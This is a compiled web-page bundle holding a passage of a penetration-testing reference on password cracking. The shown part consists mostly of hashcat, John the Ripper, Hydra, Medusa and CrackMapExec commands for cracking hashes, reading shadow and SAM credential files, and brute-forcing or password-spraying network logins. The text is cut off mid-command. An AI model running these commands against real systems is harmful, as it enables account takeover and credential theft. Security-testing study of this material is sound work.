"use strict";(globalThis.webpackChunkgl_0_bal_01=globalThis.webpackChunkgl_0_bal_01||[]).push([[5590],{28453:(r,e,n)=>{n.d(e,{R:()=>i,x:()=>o});var t=n(96540);const s={},a=t.createContext(s);function i(r){const e=t.useContext(a);return t.useMemo(function(){return"function"==typeof r?r(e):{...e,...r}},[e,r])}function o(r){let e;return e=r.disableParentContext?"function"==typeof r.components?r.components(s):r.components||s:i(r.components),t.createElement(a.Provider,{value:e},r.children)}},77294:(r,e,n)=>{n.r(e),n.d(e,{assets:()=>l,contentTitle:()=>o,default:()=>p,frontMatter:()=>i,metadata:()=>t,toc:()=>c});const t=JSON.parse('{"id":"cyber/password-cracking-guide","title":"Comprehensive Password Cracking and Brute Force Techniques","description":"An exhaustive academic reference analyzing password cracking methodologies, brute force techniques, and hash analysis for penetration testing and security research","source":"@site/docs/cyber/bruteforce_guide.md","sourceDirName":"cyber","slug":"/cyber/password-cracking-guide","permalink":"/cyber/password-cracking-guide","draft":false,"unlisted":false,"editUrl":"https://github.com/gl0bal01/gl0bal01.github.io/tree/main/docs/cyber/bruteforce_guide.md","tags":[{"inline":true,"label":"Cracking","permalink":"/tags/cracking"},{"inline":true,"label":"Brute-Force","permalink":"/tags/brute-force"}],"version":"current","lastUpdatedAt":1757146791000,"sidebarPosition":2,"frontMatter":{"id":"password-cracking-guide","title":"Comprehensive Password Cracking and Brute Force Techniques","sidebar_label":"Password Cracking","sidebar_position":2,"description":"An exhaustive academic reference analyzing password cracking methodologies, brute force techniques, and hash analysis for penetration testing and security research","keywords":["password cracking","brute force","hashcat","john the ripper","hash cracking","dictionary attacks","penetration testing","security research","credential recovery"],"authors":["gl0bal01"],"tags":["Cracking","Brute-Force"]},"sidebar":"tutorialSidebar","previous":{"title":"Network Pivoting","permalink":"/cyber/pivoting-guide"},"next":{"title":"Osint","permalink":"/osint"}}');var s=n(74848),a=n(28453);const i={id:"password-cracking-guide",title:"Comprehensive Password Cracking and Brute Force Techniques",sidebar_label:"Password Cracking",sidebar_position:2,description:"An exhaustive academic reference analyzing password cracking methodologies, brute force techniques, and hash analysis for penetration testing and security research",keywords:["password cracking","brute force","hashcat","john the ripper","hash cracking","dictionary attacks","penetration testing","security research","credential recovery"],authors:["gl0bal01"],tags:["Cracking","Brute-Force"]},o="Comprehensive Password Cracking and Brute Force Techniques: An Academic Reference Manual",l={},c=[{value:"Abstract",id:"abstract",level:2},{value:"1. Introduction",id:"1-introduction",level:2},{value:"1.1 Password Cracking Taxonomy",id:"11-password-cracking-taxonomy",level:3},{value:"1.2 Attack Selection Decision Framework",id:"12-attack-selection-decision-framework",level:3},{value:"2. Hashcat: GPU-Accelerated Password Recovery",id:"2-hashcat-gpu-accelerated-password-recovery",level:2},{value:"2.1 Basic Hash Cracking Operations",id:"21-basic-hash-cracking-operations",level:3},{value:"2.2 Advanced Attack Modes",id:"22-advanced-attack-modes",level:3},{value:"2.3 Performance Optimization",id:"23-performance-optimization",level:3},{value:"2.4 Specialized Hash Types",id:"24-specialized-hash-types",level:3},{value:"2.5 Custom Rules and Masks",id:"25-custom-rules-and-masks",level:3},{value:"3. John the Ripper: Versatile Password Cracking",id:"3-john-the-ripper-versatile-password-cracking",level:2},{value:"3.1 Basic Password Cracking Operations",id:"31-basic-password-cracking-operations",level:3},{value:"3.2 Advanced Attack Strategies",id:"32-advanced-attack-strategies",level:3},{value:"3.3 Format-Specific Operations",id:"33-format-specific-operations",level:3},{value:"3.4 Custom Configuration and Rules",id:"34-custom-configuration-and-rules",level:3},{value:"3.5 Performance and Session Management",id:"35-performance-and-session-management",level:3},{value:"4. Online Attack Tools and Techniques",id:"4-online-attack-tools-and-techniques",level:2},{value:"4.1 Hydra: Network Service Brute Force",id:"41-hydra-network-service-brute-force",level:3},{value:"4.2 Medusa: Parallel Network Login Brute Force",id:"42-medusa-parallel-network-login-brute-force",level:3},{value:"4.3 CrackMapExec: Active Directory Attack Platform",id:"43-crackmapexec-active-directory-attack-platform",level:3},{value:"4.4 Kerbrute: Kerberos Username Enumeration and Password Spraying",id:"44-kerbrute-kerberos-username-enumeration-and-password-spraying",level:3},{value:"5. Specialized Password Attack Techniques",id:"5-specialized-password-attack-techniques",level:2},{value:"5.1 Rainbow Table Attacks",id:"51-rainbow-table-attacks",level:3},{value:"5.2 Mask Attack Optimization",id:"52-mask-attack-optimization",level:3},{value:"5.3 Rule-Based Password Generation",id:"53-rule-based-password-generation",level:3},{value:"5.4 Hybrid Attack Methodologies",id:"54-hybrid-attack-methodologies",level:3},{value:"6. Password Analysis and Intelligence Gathering",id:"6-password-analysis-and-intelligence-gathering",level:2},{value:"6.1 OSINT for Password Intelligence",id:"61-osint-for-password-intelligence",level:3},{value:"6.2 Password Policy Analysis",id:"62-password-policy-analysis",level:3},{value:"6.3 Custom Wordlist Generation",id:"63-custom-wordlist-generation",level:3},{value:"7. Advanced Hash Analysis and Manipulation",id:"7-advanced-hash-analysis-and-manipulation",level:2},{value:"7.1 Hash Identification and Analysis",id:"71-hash-identification-and-analysis",level:3},{value:"7.2 Hash Extraction and Conversion",id:"72-hash-extraction-and-conversion",level:3},{value:"7.3 Salt Analysis and Rainbow Table Defense",id:"73-salt-analysis-and-rainbow-table-defense",level:3},{value:"8. Performance Optimization and Resource Management",id:"8-performance-optimization-and-resource-management",level:2},{value:"8.1 Hardware Optimization",id:"81-hardware-optimization",level:3},{value:"8.2 Distributed Cracking",id:"82-distributed-cracking",level:3},{value:"8.3 Cloud-Based Cracking",id:"83-cloud-based-cracking",level:3},{value:"9. Detection and Defense Mechanisms",id:"9-detection-and-defense-mechanisms",level:2},{value:"9.1 Attack Detection Signatures",id:"91-attack-detection-signatures",level:3},{value:"9.2 Defensive Countermeasures",id:"92-defensive-countermeasures",level:3},{value:"9.3 Honeypot and Deception Technologies",id:"93-honeypot-and-deception-technologies",level:3},{value:"10. Specialized Attack Scenarios",id:"10-specialized-attack-scenarios",level:2},{value:"10.1 Active Directory Credential Attacks",id:"101-active-directory-credential-attacks",level:3},{value:"10.2 Web Application Password Attacks",id:"102-web-application-password-attacks",level:3},{value:"10.3 Database Credential Attacks",id:"103-database-credential-attacks",level:3},{value:"11. Mobile and IoT Device Password Attacks",id:"11-mobile-and-iot-device-password-attacks",level:2},{value:"11.1 Android Password Attacks",id:"111-android-password-attacks",level:3},{value:"11.2 iOS Password Attacks",id:"112-ios-password-attacks",level:3},{value:"11.3 IoT Device Password Attacks",id:"113-iot-device-password-attacks",level:3},{value:"12. Legal and Ethical Considerations",id:"12-legal-and-ethical-considerations",level:2},{value:"12.1 Authorization Requirements",id:"121-authorization-requirements",level:3},{value:"12.2 Legal Framework Compliance",id:"122-legal-framework-compliance",level:3},{value:"12.3 Responsible Disclosure",id:"123-responsible-disclosure",level:3},{value:"12.4 Ethical Guidelines",id:"124-ethical-guidelines",level:3},{value:"13. Automation and Scripting Framework",id:"13-automation-and-scripting-framework",level:2},{value:"13.1 Comprehensive Password Testing Framework",id:"131-comprehensive-password-testing-framework",level:3},{value:"13.2 Configuration Management",id:"132-configuration-management",level:3},{value:"14. Conclusion",id:"14-conclusion",level:2},{value:"14.1 Key Takeaways",id:"141-key-takeaways",level:3},{value:"14.2 Future Research Directions",id:"142-future-research-directions",level:3},{value:"14.3 Final Recommendations",id:"143-final-recommendations",level:3},{value:"References",id:"references",level:2}];function d(r){const e={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",mermaid:"mermaid",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,a.R)(),...r.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(e.header,{children:(0,s.jsx)(e.h1,{id:"comprehensive-password-cracking-and-brute-force-techniques-an-academic-reference-manual",children:"Comprehensive Password Cracking and Brute Force Techniques: An Academic Reference Manual"})}),"\n",(0,s.jsx)(e.admonition,{title:"Alternative Brute-Force Methods",type:"tip",children:(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:(0,s.jsx)(e.a,{href:"https://colab.research.google.com/github/ShutdownRepo/google-colab-hashcat/blob/main/google_colab_hashcat.ipynb",children:"Google Colab Hash Cracking (Online)"})}),"\n",(0,s.jsx)(e.li,{children:(0,s.jsx)(e.a,{href:"https://github.com/MorDavid/BruteForceAI",children:"AI-Driven Login Brute Force Utility"})}),"\n"]})}),"\n",(0,s.jsx)(e.h2,{id:"abstract",children:"Abstract"}),"\n",(0,s.jsx)(e.p,{children:"This comprehensive academic reference presents an exhaustive analysis of password cracking methodologies, brute force techniques, and hash analysis employed in modern cybersecurity operations. We examine primary cracking frameworks, attack vectors, and optimization strategies across multiple platforms, providing detailed implementation examples, performance considerations, and defensive countermeasures. This manual serves as both theoretical foundation and practical implementation guide for cybersecurity researchers and practitioners."}),"\n",(0,s.jsx)(e.h2,{id:"1-introduction",children:"1. Introduction"}),"\n",(0,s.jsx)(e.p,{children:"Password cracking constitutes a fundamental technique in cybersecurity for credential recovery, vulnerability assessment, and security research. This methodology enables security professionals to evaluate password strength, recover lost credentials, and assess organizational security posture through systematic analysis of password policies and implementations."}),"\n",(0,s.jsx)(e.h3,{id:"11-password-cracking-taxonomy",children:"1.1 Password Cracking Taxonomy"}),"\n",(0,s.jsx)(e.p,{children:"Password cracking methodologies can be systematically categorized into six primary classes:"}),"\n",(0,s.jsxs)(e.ol,{children:["\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Dictionary Attacks"}),": Systematic testing of common passwords and wordlists"]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Brute Force Attacks"}),": Exhaustive enumeration of all possible password combinations"]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Hybrid Attacks"}),": Combination of dictionary words with rule-based mutations"]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Mask Attacks"}),": Targeted brute force using known password patterns"]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Rainbow Table Attacks"}),": Pre-computed hash lookup for rapid password recovery"]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Rule-Based Attacks"}),": Intelligent password generation using linguistic patterns"]}),"\n"]}),"\n",(0,s.jsx)(e.h3,{id:"12-attack-selection-decision-framework",children:"1.2 Attack Selection Decision Framework"}),"\n",(0,s.jsx)(e.p,{children:"The following flowchart provides a systematic approach for selecting appropriate cracking methodologies:"}),"\n",(0,s.jsx)(e.mermaid,{value:"flowchart TD\r\n    A[Start: Password Recovery Required] --\x3e B{Hash or Live System?}\r\n    \r\n    B --\x3e|Hash Available| C{Hash Type Known?}\r\n    B --\x3e|Live System| D{Service Type?}\r\n    \r\n    C --\x3e|Yes| E{GPU Available?}\r\n    C --\x3e|No| F[Hash Identification]\r\n    \r\n    E --\x3e|Yes| G[Hashcat GPU Cracking]\r\n    E --\x3e|No| H[John the Ripper CPU]\r\n    \r\n    F --\x3e I[hash-identifier<br/>hashcat --help]\r\n    I --\x3e E\r\n    \r\n    D --\x3e|SSH/RDP/SMB| J{Rate Limiting?}\r\n    D --\x3e|Web Application| K[Hydra/Medusa]\r\n    D --\x3e|Active Directory| L[Kerbrute/CrackMapExec]\r\n    \r\n    J --\x3e|Yes| M[Password Spraying]\r\n    J --\x3e|No| N[Traditional Brute Force]\r\n    \r\n    G --\x3e O{Attack Strategy?}\r\n    H --\x3e O\r\n    \r\n    O --\x3e|Fast Recovery| P[Dictionary + Rules]\r\n    O --\x3e|Comprehensive| Q[Mask + Hybrid]\r\n    O --\x3e|Targeted| R[Custom Wordlist]\r\n    \r\n    M --\x3e S[Slow, Low Detection]\r\n    N --\x3e T[Fast, High Detection]\r\n    K --\x3e U[HTTP/HTTPS Forms]\r\n    L --\x3e V[Kerberos Pre-auth]\r\n    \r\n    P --\x3e W[Implementation]\r\n    Q --\x3e W\r\n    R --\x3e W\r\n    S --\x3e W\r\n    T --\x3e W\r\n    U --\x3e W\r\n    V --\x3e W\r\n    \r\n    style A fill:#2e8b57,stroke:#fff,stroke-width:2px,color:#fff\r\n    style W fill:#228b22,stroke:#fff,stroke-width:2px,color:#fff\r\n    style G fill:#4169e1,stroke:#fff,stroke-width:2px,color:#fff\r\n    style H fill:#4169e1,stroke:#fff,stroke-width:2px,color:#fff\r\n    style M fill:#ff6347,stroke:#fff,stroke-width:2px,color:#fff\r\n    style L fill:#9370db,stroke:#fff,stroke-width:2px,color:#fff"}),"\n",(0,s.jsx)(e.h2,{id:"2-hashcat-gpu-accelerated-password-recovery",children:"2. Hashcat: GPU-Accelerated Password Recovery"}),"\n",(0,s.jsx)(e.admonition,{type:"note",children:(0,s.jsx)(e.p,{children:"The following Hashcat commands assume you have installed Hashcat with proper GPU drivers (CUDA for NVIDIA, OpenCL for AMD). Replace hash files, wordlists, and output paths with those specific to your environment. Ensure you have sufficient GPU memory and cooling for extended operations."})}),"\n",(0,s.jsx)(e.p,{children:"Hashcat represents the most advanced and widely-used password cracking tool, leveraging GPU acceleration for unprecedented cracking speeds across hundreds of hash algorithms."}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.a,{href:"https://colab.research.google.com/github/ShutdownRepo/google-colab-hashcat/blob/main/google_colab_hashcat.ipynb",children:"Online Google Colab Hash Cracking"})}),"\n",(0,s.jsx)(e.h3,{id:"21-basic-hash-cracking-operations",children:"2.1 Basic Hash Cracking Operations"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'# Identify hash type\r\nhashcat --help | grep -i "ntlm\\|md5\\|sha"\r\n\r\n# Basic dictionary attack\r\nhashcat -m 0 -a 0 hashes.txt wordlist.txt\r\n\r\n# MD5 hash cracking with rockyou\r\nhashcat -m 0 -a 0 md5_hashes.txt /usr/share/wordlists/rockyou.txt\r\n\r\n# NTLM hash cracking\r\nhashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt\r\n\r\n# SHA-256 hash cracking\r\nhashcat -m 1400 -a 0 sha256_hashes.txt wordlist.txt\r\n\r\n# Multiple wordlists combination\r\nhashcat -m 0 -a 0 hashes.txt wordlist1.txt wordlist2.txt wordlist3.txt\r\n\r\n# Show cracked passwords\r\nhashcat -m 0 hashes.txt --show\r\n\r\n# Resume interrupted session\r\nhashcat -m 0 hashes.txt --restore\n'})}),"\n",(0,s.jsx)(e.h3,{id:"22-advanced-attack-modes",children:"2.2 Advanced Attack Modes"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'# Brute force attack (all combinations)\r\nhashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a\r\n\r\n# Mask attack with known pattern\r\nhashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?d?d?d?d\r\n\r\n# Custom character set definition\r\nhashcat -m 0 -a 3 hashes.txt -1 ?l?u?d "?1?1?1?1?1?1?1?1"\r\n\r\n# Hybrid wordlist + mask attack\r\nhashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d?d\r\n\r\n# Hybrid mask + wordlist attack\r\nhashcat -m 0 -a 7 hashes.txt ?d?d?d?d wordlist.txt\r\n\r\n# Combination attack (wordlist combinations)\r\nhashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt\r\n\r\n# Rule-based attack\r\nhashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule\r\n\r\n# Multiple rules application\r\nhashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule -r rules/d3ad0ne.rule\n'})}),"\n",(0,s.jsx)(e.h3,{id:"23-performance-optimization",children:"2.3 Performance Optimization"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"# Workload tuning for maximum performance\r\nhashcat -m 0 -a 0 hashes.txt wordlist.txt -w 4\r\n\r\n# Custom kernel loops\r\nhashcat -m 0 -a 0 hashes.txt wordlist.txt -n 256 -u 1024\r\n\r\n# Benchmark specific hash type\r\nhashcat -b -m 1000\r\n\r\n# Force GPU utilization\r\nhashcat -m 0 -a 0 hashes.txt wordlist.txt -d 1,2,3\r\n\r\n# Temperature monitoring\r\nhashcat -m 0 -a 0 hashes.txt wordlist.txt --hwmon-temp-abort=90\r\n\r\n# Status information during cracking\r\nhashcat -m 0 -a 0 hashes.txt wordlist.txt --status --status-timer=60\r\n\r\n# Quiet mode for scripting\r\nhashcat -m 0 -a 0 hashes.txt wordlist.txt --quiet\r\n\r\n# Debug mode for troubleshooting\r\nhashcat -m 0 -a 0 hashes.txt wordlist.txt --debug-mode=1\n"})}),"\n",(0,s.jsx)(e.h3,{id:"24-specialized-hash-types",children:"2.4 Specialized Hash Types"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"# Windows credential hashes\r\nhashcat -m 1000 ntlm_hashes.txt wordlist.txt          # NTLM\r\nhashcat -m 3000 lm_hashes.txt wordlist.txt            # LM\r\nhashcat -m 5500 netntlmv1_hashes.txt wordlist.txt    # NetNTLMv1\r\nhashcat -m 5600 netntlmv2_hashes.txt wordlist.txt    # NetNTLMv2\r\n\r\n# Kerberos hashes\r\nhashcat -m 7500 krb5pa_hashes.txt wordlist.txt       # Kerberos 5 PA-ENC-TIMESTAMP\r\nhashcat -m 13100 krb5tgs_hashes.txt wordlist.txt     # Kerberos 5 TGS-REP\r\nhashcat -m 19600 krb5asrep_hashes.txt wordlist.txt   # Kerberos 5 AS-REP\r\n\r\n# Application-specific hashes\r\nhashcat -m 2500 wpa_hashes.txt wordlist.txt          # WPA/WPA2\r\nhashcat -m 22000 wpa3_hashes.txt wordlist.txt        # WPA3\r\nhashcat -m 1800 sha512crypt_hashes.txt wordlist.txt  # SHA512(Unix)\r\nhashcat -m 500 md5crypt_hashes.txt wordlist.txt      # MD5(Unix)\r\n\r\n# Database hashes\r\nhashcat -m 12 postgresql_hashes.txt wordlist.txt     # PostgreSQL\r\nhashcat -m 300 mysql_hashes.txt wordlist.txt         # MySQL4.1/MySQL5\r\nhashcat -m 1731 mssql_hashes.txt wordlist.txt        # MSSQL(2012/2014)\r\n\r\n# Web application hashes\r\nhashcat -m 400 phpass_hashes.txt wordlist.txt        # WordPress/phpBB3\r\nhashcat -m 3200 bcrypt_hashes.txt wordlist.txt       # bcrypt\r\nhashcat -m 8900 scrypt_hashes.txt wordlist.txt       # scrypt\n"})}),"\n",(0,s.jsx)(e.h3,{id:"25-custom-rules-and-masks",children:"2.5 Custom Rules and Masks"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'# Create custom rule file\r\ncat > custom.rule << \'EOF\'\r\n:\r\nl\r\nu\r\nc\r\nC\r\nt\r\nTlTlTl\r\n$1 $2 $3\r\n$! $@ $#\r\n^1 ^2 ^3\r\nEOF\r\n\r\n# Apply custom rules\r\nhashcat -m 0 -a 0 hashes.txt wordlist.txt -r custom.rule\r\n\r\n# Custom mask patterns\r\nhashcat -m 0 -a 3 hashes.txt "?u?l?l?l?l?d?d"          # Capital + 4 lower + 2 digits\r\nhashcat -m 0 -a 3 hashes.txt "?d?d?d?d-?d?d-?d?d"      # Date format\r\nhashcat -m 0 -a 3 hashes.txt "?l?l?l?l?l?s"            # 5 letters + special char\r\n\r\n# Increment mode for variable length\r\nhashcat -m 0 -a 3 hashes.txt --increment --increment-min=6 --increment-max=10 ?a?a?a?a?a?a?a?a?a?a\r\n\r\n# Position-specific masks\r\nhashcat -m 0 -a 3 hashes.txt -1 ?l?u -2 ?d?s "?1?1?1?1?2?2?2"\r\n\r\n# Custom character sets\r\nhashcat -m 0 -a 3 hashes.txt -1 "abcdefghijklmnopqrstuvwxyz" -2 "0123456789" "?1?1?1?1?1?2?2?2"\n'})}),"\n",(0,s.jsx)(e.h2,{id:"3-john-the-ripper-versatile-password-cracking",children:"3. John the Ripper: Versatile Password Cracking"}),"\n",(0,s.jsx)(e.admonition,{type:"note",children:(0,s.jsx)(e.p,{children:"The following John the Ripper commands assume you have compiled John with all format support or are using the Jumbo community version. Replace password files, wordlists, and session names with those specific to your environment."})}),"\n",(0,s.jsx)(e.p,{children:"John the Ripper provides comprehensive password cracking capabilities with extensive format support and intelligent attack strategies."}),"\n",(0,s.jsx)(e.h3,{id:"31-basic-password-cracking-operations",children:"3.1 Basic Password Cracking Operations"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"# Automatic hash format detection and cracking\r\njohn passwords.txt\r\n\r\n# Specify hash format explicitly\r\njohn --format=NT passwords.txt\r\n\r\n# Dictionary attack with wordlist\r\njohn --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt\r\n\r\n# Show cracked passwords\r\njohn --show passwords.txt\r\n\r\n# Show cracked passwords with format\r\njohn --show --format=NT passwords.txt\r\n\r\n# List supported formats\r\njohn --list=formats\r\n\r\n# Test hash format compatibility\r\njohn --test\r\n\r\n# Resume interrupted session\r\njohn --restore\r\n\r\n# Resume specific session\r\njohn --restore=mysession\n"})}),"\n",(0,s.jsx)(e.h3,{id:"32-advanced-attack-strategies",children:"3.2 Advanced Attack Strategies"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"# Single crack mode (uses login names)\r\njohn --single passwords.txt\r\n\r\n# Incremental mode (brute force)\r\njohn --incremental passwords.txt\r\n\r\n# Incremental with custom charset\r\njohn --incremental=Lower passwords.txt\r\n\r\n# Wordlist with rules\r\njohn --wordlist=wordlist.txt --rules passwords.txt\r\n\r\n# Wordlist with specific rule set\r\njohn --wordlist=wordlist.txt --rules=Wordlist passwords.txt\r\n\r\n# External mode (custom algorithms)\r\njohn --external=Filter_Alpha passwords.txt\r\n\r\n# Markov mode (statistical attack)\r\njohn --markov passwords.txt\r\n\r\n# Prince mode (PRINCE algorithm)\r\njohn --prince=wordlist.txt passwords.txt\r\n\r\n# Loopback mode (use cracked passwords)\r\njohn --loopback passwords.txt\n"})}),"\n",(0,s.jsx)(e.h3,{id:"33-format-specific-operations",children:"3.3 Format-Specific Operations"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"# Unix shadow file cracking\r\nunshadow /etc/passwd /etc/shadow > mypasswd\r\njohn mypasswd\r\n\r\n# Windows SAM file cracking\r\nsamdump2 SYSTEM SAM > sam_hashes.txt\r\njohn --format=NT sam_hashes.txt\r\n\r\n# ZIP file password cracking\r\nzip2john encrypted.zip > zip_hash.txt\r\njohn zip_hash.txt\r\n\r\n# RAR file password cracking\r\nrar2john encrypted.rar > rar_hash.txt\r\njohn rar_hash.txt\r\n\r\n# PDF file password cracking\r\npdf2john encrypted.pdf > pdf_hash.txt\r\njohn pdf_hash.txt\r\n\r\n# SSH private key cracking\r\nssh2john id_rsa > ssh_hash.txt\r\njohn ssh_hash.txt\r\n\r\n# PGP private key cracking\r\ngpg2john private.key > gpg_hash.txt\r\njohn gpg_hash.txt\r\n\r\n# Keepass database cracking\r\nkeepass2john database.kdbx > keepass_hash.txt\r\njohn keepass_hash.txt\r\n\r\n# TrueCrypt/VeraCrypt volume cracking\r\ntruecrypt2john volume.tc > tc_hash.txt\r\njohn tc_hash.txt\r\n\r\n# Bitcoin wallet cracking\r\nbitcoin2john wallet.dat > bitcoin_hash.txt\r\njohn bitcoin_hash.txt\n"})}),"\n",(0,s.jsx)(e.h3,{id:"34-custom-configuration-and-rules",children:"3.4 Custom Configuration and Rules"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"# Custom john.conf section\r\ncat >> ~/.john/john.conf << 'EOF'\r\n[List.Rules:MyRules]\r\n:\r\nl\r\nu\r\nc\r\nC\r\nt\r\nr\r\nd\r\nf\r\n$1 $2 $3\r\n$! $@ $#\r\n^1 ^2 ^3\r\n^a ^b ^c\r\nEOF\r\n\r\n# Apply custom rules\r\njohn --wordlist=wordlist.txt --rules=MyRules passwords.txt\r\n\r\n# Custom wordlist manipulation\r\njohn --wordlist=wordlist.txt --rules=Single passwords.txt\r\n\r\n# Generate wordlist from existing passwords\r\njohn --wordlist=cracked.txt --stdout --rules > mutated_wordlist.txt\r\n\r\n# Custom external filter\r\ncat >> ~/.john/john.conf << 'EOF'\r\n[List.External:Filter_Digits]\r\nvoid filter()\r\n{\r\n    int i, c;\r\n    i = 0;\r\n    while (c = word[i++])\r\n        if (c >= '0' && c <= '9') return;\r\n    word = 0;\r\n}\r\nEOF\r\n\r\n# Apply external filter\r\njohn --external=Filter_Digits --wordlist=wordlist.txt passwords.txt\n"})}),"\n",(0,s.jsx)(e.h3,{id:"35-performance-and-session-management",children:"3.5 Performance and Session Management"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"# Fork multiple processes\r\njohn --fork=4 passwords.txt\r\n\r\n# Set custom session name\r\njohn --session=mysession passwords.txt\r\n\r\n# Show session status\r\njohn --status\r\n\r\n# Show specific session status\r\njohn --status=mysession\r\n\r\n# Node for distributed cracking\r\njohn --node=1-4/8 passwords.txt\r\n\r\n# Memory-mapped wordlists\r\njohn --wordlist=wordlist.txt --mem-file-size=1024 passwords.txt\r\n\r\n# Pot file management\r\njohn --pot=custom.pot passwords.txt\r\n\r\n# Log file specification\r\njohn --log-stderr passwords.txt 2> john.log\r\n\r\n# Verbose output\r\njohn -v passwords.txt\r\n\r\n# Maximum run time\r\njohn --max-run-time=3600 passwords.txt\n"})}),"\n",(0,s.jsx)(e.h2,{id:"4-online-attack-tools-and-techniques",children:"4. Online Attack Tools and Techniques"}),"\n",(0,s.jsx)(e.admonition,{type:"note",children:(0,s.jsx)(e.p,{children:"All online attack tools should only be used against systems you own or have explicit written authorization to test. Always be mindful of rate limiting, account lockout policies, and detection mechanisms."})}),"\n",(0,s.jsx)(e.h3,{id:"41-hydra-network-service-brute-force",children:"4.1 Hydra: Network Service Brute Force"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:'# Basic service brute force\r\nhydra -l admin -p admin target_ip ssh\r\n\r\n# User and password lists\r\nhydra -L users.txt -P passwords.txt target_ip ssh\r\n\r\n# Single user, multiple passwords\r\nhydra -l admin -P passwords.txt target_ip ssh\r\n\r\n# Multiple services\r\nhydra -L users.txt -P passwords.txt target_ip ssh ftp telnet\r\n\r\n# HTTP form brute force\r\nhydra -L users.txt -P passwords.txt target_ip http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"\r\n\r\n# HTTPS form brute force\r\nhydra -L users.txt -P passwords.txt target_ip https-post-form "/login:user=^USER^&pass=^PASS^:Invalid"\r\n\r\n# SMB brute force\r\nhydra -L users.txt -P passwords.txt target_ip smb\r\n\r\n# RDP brute force\r\nhydra -L users.txt -P passwords.txt target_ip rdp\r\n\r\n# Database brute force\r\nhydra -L users.txt -P passwords.txt target_ip mysql\r\nhydra -L users.txt -P passwords.txt target_ip postgres\r\nhydra -L users.txt -P passwords.txt target_ip mssql\r\n\r\n# Custom port specification\r\nhydra -L users.txt -P passwords.txt -s 2222 target_ip ssh\r\n\r\n# Parallel task control\r\nhydra -t 16 -L users.txt -P passwords.txt target_ip ssh\r\n\r\n# Verbose output\r\nhydra -v -L users.txt -P passwords.txt target_ip ssh\r\n\r\n# Continue on successful login\r\nhydra -c -L users.txt -P passwords.txt target_ip ssh\r\n\r\n# Wait time between attempts\r\nhydra -w 30 -L users.txt -P passwords.txt target_ip ssh\r\n\r\n# Exit after first valid pair\r\nhydra -f -L users.txt -P passwords.txt target_ip ssh\n'})}),"\n",(0,s.jsx)(e.h3,{id:"42-medusa-parallel-network-login-brute-force",children:"4.2 Medusa: Parallel Network Login Brute Force"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"# Basic authentication testing\r\nmedusa -h target_ip -u admin -p admin -M ssh\r\n\r\n# User and password file combination\r\nmedusa -H targets.txt -U users.txt -P passwords.txt -M ssh\r\n\r\n# Multiple protocols\r\nmedusa -h target_ip -U users.txt -P passwords.txt -M ssh -M ftp -M telnet\r\n\r\n# HTTP authentication\r\nmedusa -h target_ip -u admin -P passwords.txt -M http -m DIR:/admin\r\n\r\n# SMB authentication\r\nmedusa -h target_ip -U users.txt -P passwords.txt -M smbnt\r\n\r\n# Database authentication\r\nmedusa -h target_ip -u root -P passwords.txt -M mysql\r\nmedusa -h target_ip -u postgres -P passwords.txt -M postgres\r\n\r\n# Thread control\r\nmedusa -t 20 -h target_ip -U users.txt -P passwords.txt -M ssh\r\n\r\n# Verbose logging\r\nmedusa -v 6 -h target_ip -U users.txt -P passwords.txt -M ssh\r\n\r\n# Resume file\r\nmedusa -Z h:u:p -h target_ip -U users.txt -P passwords.txt -M ssh\r\n\r\n# Output file\r\nmedusa -O medusa_results.txt -h target_ip -U users.txt -P passwords.txt -M ssh\r\n\r\n# Continue after success\r\nmedusa -C -h target_ip -U users.txt -P passwords.txt -M ssh\r\n\r\n# Password delay\r\nmedusa -s -h target_ip -U users.txt -P passwords.txt -M ssh\n"})}),"\n",(0,s.jsx)(e.h3,{id:"43-crackmapexec-active-directory-attack-platform",children:"4.3 CrackMapExec: Active Directory Attack Platform"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"# SMB authentication testing\r\ncrackmapexec smb target_ip -u users.txt -p passwords.txt\r\n\r\n# Password spraying\r\ncrackmapexec smb targets.txt -u administrator -p Password123\r\n\r\n# Hash spraying\r\ncrackmapexec smb targets.txt -u administrator -H ntlm_hash\r\n\r\n# Continue on 